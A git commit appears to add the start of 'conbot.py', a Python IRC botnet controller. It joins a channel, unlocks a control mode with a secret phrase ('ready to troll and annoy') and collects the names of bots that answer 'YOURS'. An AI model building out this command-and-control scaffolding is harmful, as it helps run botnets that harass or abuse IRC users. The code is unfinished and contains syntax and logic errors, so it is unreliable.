9c25670088605cbb27827c2507a06162816a60fd
Andrew L <alata.it@gmail.com>
2017-04-05 19:12:43 -0600

    Added the start of conbot from a modified bot. Need to set bot to send response message 'YOURS' to bot controller who is named 'MasterOfDisaster' by default. Might also change the conbot name to be generated

---
+++ conbot.py
@@ -0,0 +1,93 @@
+#!/usr/bin/python3
+
+import sys
+import socket
+import random
+import string
+
+class PyBot:
+  #PyBot object constructor 
+  def __init__(self,host,port,channel,secret,s):
+
+    #Create PyBot instanace variables
+    self.host = host
+    self.port = port
+    self.channel = channel
+    self.secret = secret
+    self.nick = "MasterOfDisaster"
+    self.controlMode = 0 #default 0 = bot not being controller
+
+    try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
+      self.s = s.connect((host,int(port)))
+      s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
+      s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
+    except:
+      print("unable to connect to irc server")
+    s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
+
+  def listen(self):
+    while True:
+      data = ""
+      data = s.recv(4096).decode("UTF-8")
+      data = data.strip("\n\r")
+      print("DEBUG --> data recieved: " + data)
+
+      if data.find("PING :") != -1:  #Respond to server pings (keep alive)
+        s.send(bytes("PONG :pingis\n","UTF-8"))
+
+      elif data.find("PRIVMSG") != -1:
+        temp = data.split("!")
+        user = temp[0][1:] #extract and trim user from temp
+        temp = data.split("PRIVMSG")
+        temp2 = temp[1].split(":")
+        message = temp2[1]
+        print("DEBUG --> " + user + " Says: " + message)
+        self.examinePrivmsg(user,message)
+
+  def examinePrivmsg(self,user,message):
+# This needs to be updated to store the controller's information and accept control commands from the controller only
+    if message == secret:
+      print("DEBUG --> Controller said the secret! Control Mode enabled, read to troll and annoy")
+      self.control = 1
+
+  def changeChannel(self,newChannel):
+    print("DEBUG --> Changing channel")     
+
+  def identifyBots(self,secret,channel):
+    self.s.send(bytes("PRIVMSG " + channel + " " + secret + "\n")) # Send 'hello' message for bots to identify themselves
+    self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
+    for(i in range(5000)): # NOTE --> I'm not sure how long I should be listening for bot replies, this may need to be adjusted
+      data = self.s.recv(2048).decode("UTF-8")
+      data = data.strip("\r\n")
+      if(data.find("PRIVMSG {} :".format(self.nick))!=-1 and data.split("PRIVMSG",1)[1].split(":",1)[1]=="YOURS"): # NOTE --> The response message that we're expecting from bots is "YOURS"
+        temp = data.split("!",1)[0][1:] # Finds name of the bot reply
+        self.botList.append(temp[0][1:]) # Adds the name of the bot reply to botList
+        
+
+#Main
+if __name__ == '__main__':
+
+  if(len(sys.argv) == 5):
+    host = sys.argv[1]
+    port = sys.argv[2]
+    channel = "#"+sys.argv[3]
+    secret = sys.argv[4]
+  else:
+    print("Incorrect number of arguments")
+    sys.exit("Usage: bot <hostname> <port> <channel> <secret-phrase>")
+
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  conBot = PyBot(host,port,channel,secret,s) #Create an instance of the bot 
+  
+
+
+
+
+
+
+
+
+
+
+
+
